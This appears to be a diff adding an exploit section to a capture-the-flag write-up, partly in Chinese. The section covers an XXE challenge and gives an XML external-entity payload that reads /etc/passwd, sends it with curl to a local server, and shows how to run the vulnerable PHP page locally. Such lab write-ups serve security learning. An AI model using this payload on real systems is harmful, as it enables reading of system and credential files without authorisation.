@@ -54,4 +54,34 @@ Challenge: http://h4ck3r.quest:8604/
 ```
 
 ## Exploit - XXE
-1. Normal Usage in this webpage
+Normal Usage in this webpage → 修改封包
+* Payload
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ANY [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<test>
+<user>&xxe;</user>
+</test>
+```
+or
+```bash
+$ curl -X POST http://localhost:8000 \
+-d '<?xml version="1.0"?>
+<!DOCTYPE ANY [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<test>
+<user>&xxe;</user>
+</test>'
+```
+## 如果要Deploy on localhost
+1. 安裝`php-xml`
+    ```bash
+    $ sudo apt install php-xml -y
+    ```
+2. Start Server
+    ```bash
+    $ php -S localhost:8000 -f ./php_login.php
+    ```
